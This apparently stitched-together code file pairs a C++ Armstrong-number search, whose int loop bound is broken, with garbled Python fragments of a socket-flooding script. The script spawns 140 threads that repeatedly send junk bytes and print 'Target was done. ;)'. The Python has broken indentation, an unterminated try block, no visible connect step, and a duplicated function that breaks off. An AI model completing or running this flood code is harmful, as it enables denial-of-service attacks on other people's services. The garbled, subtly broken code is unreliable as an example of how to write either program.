#include <iostream>
#include <cmath>
using namespace std;

int main()
{
  for(int num=0;num<10000000000000;num++){
    int temp,digitNUmber=0;

   temp=num;

   do{
    digitNUmber++;
   } while(temp/=10);

   temp=num;

   int sum = 0;
   while(temp){
        sum+= pow(temp % 10,digitNUmber);
    temp/=10;
   }
   if(num==sum)
    cout << num << endl;

  }

return 0;
}

import socket
from threading import Thread
def a():
    while True:
        s = socket.socket()
        try:

            print("Target was done. ;)")

                    s.send(b"SBFISH"*2200)

                    print("+",end="")
                    break
for i in range(140):
    Thread(target=a).start()

from threading import Thread
def a():
    while True:

                except Exception as error:
                    pass
